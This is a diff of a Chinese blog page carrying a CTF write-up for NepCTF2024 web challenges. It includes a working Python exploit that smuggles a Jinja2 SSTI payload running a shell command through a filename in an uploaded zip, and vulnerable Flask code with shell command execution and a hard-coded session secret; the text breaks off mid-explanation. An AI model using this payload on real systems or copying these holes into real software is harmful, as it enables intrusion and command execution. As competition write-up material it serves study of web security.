@@ -1,1079 +1,742 @@
-<!--
-	作者：Sariay
-	时间：2018-08-26
-	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
--->
+
+
 <!DOCTYPE html>
-<html class="html-loading">
-		
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
-	<meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <title>
-    
-      NepCTF2024部分web | Infernity&#39;s Blog
-    
-  </title>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
   <meta name="author" content="Infernity">
-  <meta name="keywords" content="" />
-  <meta name="description" content="blog" />
-	<!-- favicon -->
-  <link rel="shortcut icon" href="/img/I.png">
-
-  <!-- css -->
+  <meta name="keywords" content="">
   
-<link rel="stylesheet" href="/css/Annie.css">
-
+    <meta name="description" content="NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里 12if os.path.islink(new_file):    return &amp;#x27;Symbolic links are not allowed.&amp;#x27;  把软连接给ban了，就不能通过文件上传来解决问题了。 我们注意文件上传的这一段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2024部分web">
+<meta property="og:url" content="http://example.com/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里 12if os.path.islink(new_file):    return &amp;#x27;Symbolic links are not allowed.&amp;#x27;  把软连接给ban了，就不能通过文件上传来解决问题了。 我们注意文件上传的这一段">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/nepctf2024/nepctf2024.png">
+<meta property="article:published_time" content="2024-08-25T10:27:51.000Z">
+<meta property="article:modified_time" content="2025-01-20T02:35:53.318Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/nepctf2024/nepctf2024.png">
   
-  <!-- jquery -->
-	
-<script src="/plugin/jquery/jquery.min.js"></script>
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NepCTF2024部分web - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script>
-    const CONFIG_BGIMAGE = {
-      mode: 'random_you',
-      normalSrc: '/img/header-bg.jpg',
-      randomYouMax: 59,
-      randomYouSrc: '/img/background/',
-	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
-	  preloaderEnable: true
-    }
-	
-    const CONFIG_LEACLOUD_COUNT = {
-      enable: true,
-	  appId: 'AU8',
-	  appKey: '4cU',
-	  serverURLs: 'http' || ' '
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.3.0"></head>
-	<body>
-		<!-- Preloader -->
-
-	<div id="preloader">
-		<div class="pre-container">
-			
-				<div class="spinner">
-					<div class="double-bounce1"></div>
-					<div class="double-bounce2"></div>
-				</div>
-						
-		</div>
-	</div>
 
 
-<!-- header -->
-<header class="fixbackground bg-pan-br">
-	<div class="mask">
-		<!-- motto -->
-		<div class="h-body">	
-			
-				<div class="motto text-shadow-pop-left">
-					<p class="content" id="motto-content">获取中...</p>
-					<p>-<p>
-					<p class="author" id="motto-author">Just a minute...</p>
-				</div>
-			
-		</div>
-		
-		<!-- others: such as time... -->			
-		<div class="h-footer">
-			<a href="javascript:;" id="read-more" class="scroll-down">
-				<span class="icon-anchor1 animation-scroll-down"></span>
-			</a>
-		</div>
-	</div>
-</header>
+<body>
+  
 
-<div id="navigation-hide">
-	<!-- Progress bar -->
-	<div id="progress-bar"></div>
-
-	<!-- Progress percent -->
-	<div id="progress-percentage"><span>0.0%</span></div>
-
-	<div class="toc-switch"><span class="switch-button">目录</span></div>
-
-	<!-- Page title -->
-	<p>
-		
-			「NepCTF2024部分web」
-		
-	</p>
-
-	
-	
-		<span id="star-button" rel="unlike">
-			<i class="icon-heart"></i>
-		</span>
-	
-
-	<!-- Nav trigger for navigation-H-->
-	<a class="nav-trigger"><span></span></a>
-</div>
-
-<!-- Navigation in div(id="navigation-H") -->
-<nav class="nav-container" id="cd-nav">
-	<div class="nav-header">
-		<span class="logo"> 
-			<img src="/img/logo.png">
-		</span>
-		<a href="javascript:;" class="nav-close"></a>
-	</div>
-	
-	<div class="nav-body">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-	
-	<div class="nav-footer">
-		<ul id="global-social">
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/qq.png" target="_blank">
-				<span class="icon-qq"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
-				<span class="icon-github"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/weixin.jpg" target="_blank">
-				<span class="icon-weixin"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
-				<span class="icon-csdn"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-instagram"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-twitter"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/atom.xml" target="_blank">
-				<span class="icon-rss"></span>
-			</a>
-		</li>
-			
-</ul>
-
-	</div>
-</nav>
-			
-		<!--main-->
-		<main>
-			<!--
-	时间：2018-11-17
-	描述：
-		插件名称：katelog.min.js
-		插件作者：KELEN
-		插件来源: https://github.com/KELEN/katelog
--->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
-	 
-
-<div class="layout-post">
-	<div id="layout-post">
-		<div class="article-title">
-			
-	<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" itemprop="url">
-		NepCTF2024部分web
-	</a>
-
-		</div>
-
-		<div class="article-meta">
-			<span>
-				<i class="icon-calendar1"></i>
-				
-				
-
-
-
-
-	更新于
-
-	<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" itemprop="url">
-		<time datetime="2024-08-25T10:27:51.000Z" itemprop="dateUpdated">
-	  		2024-08-28
-	  </time>
-	</a> 
-
-
-
-			</span>
-			<span>
-				
-	<i class="icon-price-tags"></i>
-	
-		<a href="/tags/WPs/" class=" ">
-			WPs
-		</a>
-	
-		
-			</span>
-			
-			
-
-	
-    <span class="leancloud_visitors" id="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/_visitors" data-url="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" data-title="NepCTF2024部分web">
-       	<i class="icon-eye"></i>
-       	热度
-        
-            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
-                   
-    </span>
+  <header>
     
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">NepCTF2024部分web</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-25 18:27" pubdate>
+          2024年8月25日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
 
 
-	
-    <span class="leancloud_likes" id="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/_likes" data-url="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" data-title="NepCTF2024部分web" rel="unlike">
-        <i class="icon-heart"></i>
-        喜欢
-        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
-    </span>
-	
+        
+      </div>
 
-		</div>
+      
+    </div>
+  </div>
+</div>
 
-		<div class="article-content" id="article-content">
-			<h1 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h1><p>代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.islink(new_file):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Symbolic links are not allowed.&#x27;</span></span><br></pre></td></tr></table></figure>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NepCTF2024部分web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h1><p>代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> os.path.islink(new_file):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p>把软连接给ban了，就不能通过文件上传来解决问题了。</p>
 <p>我们注意文件上传的这一段代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">files_list = []</span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(unzip_folder):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        file_path = os.path.join(root, file)</span><br><span class="line">        relative_path = os.path.relpath(file_path, app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">        link = <span class="string">f&#x27;&lt;a href=&quot;/cat?file=<span class="subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span></span><br><span class="line">        files_list.append(link)</span><br><span class="line"><span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">files_list = []<br><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        file_path = os.path.join(root, file)<br>        relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])<br>        link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span><br>        files_list.append(link)<br><span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))<br></code></pre></td></tr></table></figure>
 
 <p>link被加入了files_list，然后files_list会被加入网页进行模版渲染，而且link的{file}，也就是文件名我们可控，这就相当于是ssti模版注入了。</p>
 <p>直接上exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://neptune-26461.nepctf.lemonprefect.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cd ..;cat flag&#x27;).read()&#125;&#125;&quot;</span>  <span class="comment">#注意斜杠不能用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">f&quot;C:\\Users\\13664\\Desktop\\<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file_path, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">zip</span> = zipfile.ZipFile(<span class="string">r&quot;C:\Users\13664\Desktop\flag.zip&quot;</span>, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line"><span class="built_in">zip</span>.write(file_path)</span><br><span class="line"><span class="built_in">zip</span>.close()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;tp_file&#x27;</span>: <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\13664\Desktop\flag.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">os.remove(file_path)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br>url = <span class="hljs-string">&#x27;https://neptune-26461.nepctf.lemonprefect.cn/&#x27;</span><br><br>payload = <span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cd ..;cat flag&#x27;).read()&#125;&#125;&quot;</span>  <span class="hljs-comment">#注意斜杠不能用</span><br><br><br>file_path = <span class="hljs-string">f&quot;C:\\Users\\13664\\Desktop\\<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span><br>f = <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;w+&#x27;</span>)<br>f.close()<br><span class="hljs-built_in">zip</span> = zipfile.ZipFile(<span class="hljs-string">r&quot;C:\Users\13664\Desktop\flag.zip&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-built_in">zip</span>.write(file_path)<br><span class="hljs-built_in">zip</span>.close()<br><br>files = &#123;<span class="hljs-string">&#x27;tp_file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\13664\Desktop\flag.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><br>res = requests.post(url=url, files=files)<br><span class="hljs-built_in">print</span>(res.text)<br><br>os.remove(file_path)<br></code></pre></td></tr></table></figure>
 
 <p>这个题出的挺好的。</p>
 <h1 id="蹦蹦炸弹（boom-it）"><a href="#蹦蹦炸弹（boom-it）" class="headerlink" title="蹦蹦炸弹（boom_it）"></a>蹦蹦炸弹（boom_it）</h1><p>这个题也是一堆障眼法，什么账号密码什么金钱数量都是没用的。主要就是这一段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;admin_logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span></span><br><span class="line">        filename = file.filename</span><br><span class="line">        file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line">    cmd_output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;cmd&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;lock.txt&quot;</span>):  <span class="comment"># 检查当前目录下是否存在lock.txt</span></span><br><span class="line">            cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd_output = subprocess.check_output(cmd, shell=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                cmd_output = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd_output = <span class="string">&quot;lock.txt not found. Command execution not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="string">&quot;cmdExecute&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_dashboard</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> request.files:<br>            file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br>        filename = file.filename<br>        file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span><br><br>    cmd_output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;lock.txt&quot;</span>):  <span class="hljs-comment"># 检查当前目录下是否存在lock.txt</span><br>            cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                cmd_output = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                cmd_output = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">else</span>:<br>            cmd_output = <span class="hljs-string">&quot;lock.txt not found. Command execution not allowed.&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="hljs-string">&quot;cmdExecute&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>首先会验证我是否是admin登录，这里需要伪造jwt，但是key在哪呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.secret_key = &quot;super_secret_key&quot;</span><br></pre></td></tr></table></figure>
